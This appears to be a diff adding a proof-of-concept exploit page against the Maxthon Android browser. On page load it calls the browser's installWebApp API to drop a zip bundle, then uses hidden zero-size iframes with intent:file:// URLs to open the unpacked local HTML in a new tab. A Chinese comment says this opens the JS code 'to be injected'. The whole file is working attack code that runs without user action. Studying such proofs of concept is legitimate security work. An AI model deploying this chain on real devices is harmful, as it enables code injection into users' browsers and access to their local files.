@@ -1,0 +1,17 @@
+<html>
+    <script>
+    	function install() {
+        	mmbrowser.installWebApp('test.zip');
+        };
+        function open_tab_js_in_sdcard() {
+            document.write('<iframe width="0" height="0" src="intent:file:///storage/sdcard/webapp/test/test.html#Intent;component=com.mx.browser/com.mx.browser.MxBrowserActivity;end"></iframe>');
+        };
+        function open_tab_js_in_device() {
+            document.write('<iframe width="0" height="0" src="intent:file:///storage/webapp/test/test.html#Intent;component=com.mx.browser/com.mx.browser.MxBrowserActivity;end"></iframe>');
+        };
+        install();
+        //        setTimeout(function(){},3000);  //  等待要注入的js 代码解压缩之后用浏览器新建标签打开
+        open_tab_js_in_sdcard();
+        open_tab_js_in_device();
+    </script>
+</html>
